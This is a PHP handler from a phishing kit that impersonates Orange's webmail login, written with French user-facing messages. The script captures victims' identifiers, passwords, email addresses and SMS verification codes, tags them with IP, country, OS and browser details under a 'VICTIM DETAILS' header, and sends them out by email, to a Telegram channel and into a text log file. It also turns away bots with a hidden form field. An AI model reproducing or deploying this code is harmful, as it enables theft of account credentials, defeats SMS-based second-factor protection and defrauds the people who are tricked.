<?php


include_once '../inc/app.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

function validate_cc_date($month,$year) {
    if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
        return $month . '/' . $year;
    } else {
        return false;
    }
}


$to = '';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if ($_POST['type'] == "login") {

        $_SESSION['identifiant'] = $_POST['identifiant'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['identifiant']) == false ) {
            $_SESSION['errors']['identifiant'] = 'Veuillez saisir un identifiant valide';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | ORANGEMAIL | Login';
            $message = '/-- LOG INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END LOG INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            /*mail($to,$subject,$message,$headers);
            file_put_contents("../rzzz123.txt", $message, FILE_APPEND);*/
            header("location: pass.php?#_$dispatch");

        } else {
            header("location: login.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "pass") {

        $_SESSION['password'] = $_POST['password'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['password']) == false ) {
            $_SESSION['errors']['password'] = 'Veuillez saisir un mot de passe valide';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | ORANGEMAIL | Login';
            $message = '/-- LOG INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END LOG INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- LOG INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $telegram_message .= 'Password : ' . $_POST['password'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../rzzz123.txt", $message, FILE_APPEND);
            header("location: verify.php?verify#_$dispatch");

        } else {
            header("location: pass.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "confirm_code1") {

        $_SESSION['confirm_code1'] = $_POST['confirm_code1'];

        $_SESSION['errors'] = [];
        if( empty($_POST['confirm_code1']) ) {
            $_SESSION['errors']['confirm_code1'] = 'Ce champ est obligatoire';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | ORANGEMAIL | Sms 1';
            $message = '/-- SMS INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Sms code 1 : ' . $_POST['confirm_code1'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- SMS INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'Sms code 1 : ' . $_POST['confirm_code1'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../rzzz123.txt", $message, FILE_APPEND);
            header("location: ologin.php?confirmation#_$dispatch");
        } else {
            header("location: ss1.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "oemail") {

        $_SESSION['email'] = $_POST['email'];

        $_SESSION['errors'] = [];
        if( empty($_POST['email']) ) {
            $_SESSION['errors']['email'] = 'ce champ est obligatoire';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $zz = ($_POST['error']) ? 2 : 1;

            $subject = get_user_ip() . ' | ORANGE | Email';
            $message = '/-- EMAIL INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Email : ' . $_POST['email'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END EMAIL INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            //mail($to,$subject,$message,$headers);
            //file_put_contents("../rzzz123.txt", $message, FILE_APPEND);
            header("location: opass.php?validation#_$dispatch");

        } else {
            header("location: ologin.php?error=1&#_$dispatch");
        }

    }

    if ($_POST['type'] == "opassword") {

        $_SESSION['password'] = $_POST['password'];

        $_SESSION['errors'] = [];
        if( empty($_POST['password']) ) {
            $_SESSION['errors']['password'] = 'Vous n\'avez pas saisi votre mot de passe.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $zz = ($_POST['error']) ? 2 : 1;

            $subject = get_user_ip() . ' | ORANGE | Login';
            $message = '/-- ORANGE LOGIN INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Email : ' . $_SESSION['email'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END ORANGE LOGIN INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- ORANGE LOGIN INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'Email : ' . $_SESSION['email'] . "\r\n";
            $telegram_message .= 'Password : ' . $_POST['password'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../rzzz123.txt", $message, FILE_APPEND);
            header("location: oloading.php?validation#_$dispatch");
        } else {
            header("location: opass.php?error=1&#_$dispatch");
        }

    }

    if ($_POST['type'] == "oconfirm_code") {

        $_SESSION['oconfirm_code']   = $_POST['oconfirm_code'];

        $_SESSION['errors'] = [];
        if( empty($_POST['oconfirm_code']) ) {
            $_SESSION['errors']['oconfirm_code'] = 'le code n\'est pas valide';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $zz = ($_POST['error']) ? 2 : 1;

            $subject = $_SERVER['REMOTE_ADDR'] . ' | ORANGE | Sms';
            $message = '/-- ORANGE SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Sms code : ' . $_POST['oconfirm_code'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END ORANGE SMS INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- ORANGE SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Sms code : ' . $_POST['oconfirm_code'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../rzzz123.txt", $message, FILE_APPEND);
            header("location: success.php?validation#_$dispatch");
        } else {
            header("location: oss.php?error=1&#_$dispatch");
        }

    }
    
}

?>